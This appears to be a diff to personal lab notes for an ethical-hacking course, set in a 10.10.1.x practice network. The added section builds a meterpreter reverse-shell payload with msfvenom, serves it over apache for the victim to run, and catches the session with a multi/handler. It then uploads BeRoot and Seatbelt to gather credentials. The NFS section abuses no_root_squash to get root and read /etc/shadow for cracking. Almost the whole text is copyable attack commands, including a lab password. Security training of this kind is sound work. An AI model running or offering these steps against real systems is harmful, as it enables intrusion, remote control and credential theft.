@@ -1,5 +1,29 @@
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-** Escalate Privileges in Linux Machine by Exploiting Misconfigured NFS  [Network File System (NFS) is a protocol that enables users to access files remotely through a network. Remote NFS can be accessed locally when the shares are mounted. If NFS is misconfigured, it can lead to unauthorized access to sensitive data or obtain a shell on a system.] **
+# Escalate Privileges using Privilege Escalation Tools and Exploit Client-Side Vulnerabilities 
+------------------------------------------------------------------------------------------------
+>>> Parrot Machine [Attacker/10.10.1.13]
+1. msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=10.10.1.13 -f exe > /home/attacker/Desktop/Exploit.exe (creating payload using msfvenom)
+2. mkdir /var/www/html/share  >>  chmod -R 755 /var/www/html/share   >>  chown -R www-data:www-data /var/www/html/share  >>  ls -la /var/www/html/ | grep share  (sending the malicious payload through a shared directory) 
+3. cp /home/attacker/Desktop/Exploit.exe /var/www/html/share/     (copy payload to shared directory)
+4. service apache2 start
+5. msfconsole  >>  use exploit/multi/handler  >>  set payload windows/meterpreter/reverse_tcp  >>  show options (set lhost or lport)  >>  exploit -j -z 
+>>> Windows Machine [Target/10.10.1.11]
+6. Open browser(firefox)  >> search for "http://10.10.1.13/share" >> download and run exploit.exe
+>>> Parrot Machine [Attacker/10.10.1.13]
+7.  sessions -i 1  >> getuid >> sysinfo >> run vnc   (Meterpreter session)
+8. Places(top menu on the desktop)  >>  Network >>   press Ctrl+L  >> smb://10.10.1.11  >> Credentials(Admin,Pa$$w0rd)10.
+9. upload /home/attacker/Desktop/BeRoot/beRoot.exe       [In Terminal(meterpreter)]
+10. shell  (to open a shell session)    >>  dir  >>  beroot.exe  (beroot start his work and show you the result in terminal and you can use that information to find vulnerability in targat system.)
+11. upload /home/attacker/Desktop/BeRoot/Seatbelt.exe
+12. shell >> dir >> Seatbelt.exe -group=system(gather information about AMSIProviders, AntiVirus, AppLocker etc)  >>  Seatbelt.exe -group=user (gather information about ChromiumPresence, CloudCredentials, CloudSyncProviders, CredEnum, dir, DpapiMasterKeys etc) >> Seatbelt.exe -group=misc (gather information about ChromiumBookmarks, ChromiumHistory, ExplicitLogonEvents, FileInfo etc)
+
+
+
+
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+# Escalate Privileges in Linux Machine by Exploiting Misconfigured NFS(Network File System) :-
+--------------------------------------------------------------------------------------------
+[Network File System (NFS) is a protocol that enables users to access files remotely through a network. Remote NFS can be accessed locally when the shares are mounted. If NFS is misconfigured, it can lead to unauthorized access to sensitive data or obtain a shell on a system.] 
 >>> UBUNTU MACHINE [TARGET]
 1. sudo apt install nfs-kernel-server
 2. sudo nano /etc/exports   >>  /home *(rw,no_root_squash) >>  CTRL+S(save) >> CTRL+X(exit) 
@@ -17,11 +41,11 @@
 13. sudo df -h                      (get the amount of free disk available)
 14. ssh -l ubuntu 10.10.1.9   >> toor(password)                 (login into target machine using ssh)
 15. cd /home >> ls
-16. ./bash -p                 (-p : giving root privileges to bash)
+16. ./bash -p                 (-p : start bash with root privileges )
 17. id >>  whoami  >>  cp /bin/nano .  >> chmod 4777 nano   >>  ls -la nano  >> ls >>  ./nano -p /etc/shadow (showing the hashes of all users You can copy any hash from the file and crack it using john the ripper or hashcat tools, to get the password of desired users)  
 18. cat /etc/crontab        (to view the running cronjobs)
 19. ps -ef         (to view current processes along with their PIDs)
 20. find / -name "*.txt" -ls 2> /dev/null    (view all the .txt files on the system)
 21. route -n          (view the host/network names in numeric form)
 22. find / -perm -4000 -ls 2> /dev/null          (view the SUID executable binaries)
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
